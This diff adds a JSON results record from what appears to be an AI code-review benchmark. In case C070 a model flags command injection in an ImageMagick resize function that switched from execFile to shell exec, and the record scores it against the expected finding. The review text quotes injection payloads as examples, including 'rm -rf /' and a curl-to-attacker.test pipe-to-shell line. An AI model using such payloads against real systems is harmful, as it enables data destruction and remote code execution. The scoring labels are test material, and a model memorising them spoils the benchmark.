@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 45.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 45.3,
+  "usage": {
+    "in": 32262,
+    "cache_read": 116992,
+    "cache_write": 0,
+    "out": 3406,
+    "source": "cli"
+  },
+  "cost_usd": 0.1200576,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "warning",
+      "body": "**Claimed critical; verifier found:** verifier off\n\n**Command injection:** `exec()` runs through a shell, and both `src` and `filter` are interpolated into the command string without sanitization.\n\n**Failure mode:** a caller-controlled `filter` such as `Lanczos; rm -rf /` or a `src` containing `\"` breaks out of the quoted path and runs arbitrary commands as the process user. Example: `filter = \"Lanczos; id > /tmp/pwned\"` executes `id` after `convert`.\n\n**Fix:** keep the no-shell boundary with `execFile` and pass arguments as an argv array. ImageMagick `-filter` does not require a shell:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\nAlso restore `import { execFile } from \"child_process\";` and validate `filter` against an allowlist of known ImageMagick filter names if the value is user-supplied."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity": "warning",
+      "body": "The comment states that `-filter` needs a shell for user-composed filter expressions. ImageMagick accepts `-filter <name>` as a normal argv pair (`Lanczos`, `Mitchell`, `Catrom`, etc.). A shell does not unlock legitimate filter features; it only adds injection surface.\n\nRemove the comment when restoring `execFile`, or replace it with an allowlist note if filter names are user-supplied."
+    }
+  ],
+  "summary": "## Verdict\n\n**Critical security regression** \u2014 this change replaces safe `execFile` argv invocation with shell `exec` and interpolates caller-controlled `src` and `filter` into the command string. That is command injection on any path that reaches `resize()`.\n\n## Analysis\n\n`child_process.exec` runs the command through a shell. Embedding `\"${src}\"` and bare `${filter}` means metacharacters in either argument become shell syntax:\n\n- `filter`: `Lanczos; curl attacker.test/exfil | sh` (unquoted expansion)\n- `src`: `image.png\"; id > /tmp/pwned; echo \"` (breaks out of the double quotes)\n\nThe inline comment claiming ImageMagick `-filter` needs a shell is incorrect. `-filter` takes a single token (e.g. `Lanczos`, `Mitchell`); `execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", f\"{w}x\", \"/tmp/out.png\"])` preserves the previous no-shell boundary and still supports user-chosen filter names. If a future filter form truly required complex expressions, those must be validated against an allowlist and passed as discrete argv elements \u2014 never via shell concatenation.\n\n`w` is also interpolated unquoted; a non-number at runtime would be another injection vector (TypeScript does not enforce this at runtime).\n\n## Release decision\n\nDo not merge until `execFile` (or equivalent argv-only spawn) is restored and `filter` is allowlisted or strictly validated.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "skipped",
+      "reason": "verifier off"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 4,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "verifier off"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 0,
+    "seconds": 0.0,
+    "verified": 0,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 2,
+    "model": "",
+    "alias": "",
+    "endpoint_kind": "",
+    "reason": "verifier off",
+    "usage": {
+      "in": 0,
+      "out": 0
+    },
+    "cost_usd": null
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 0,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
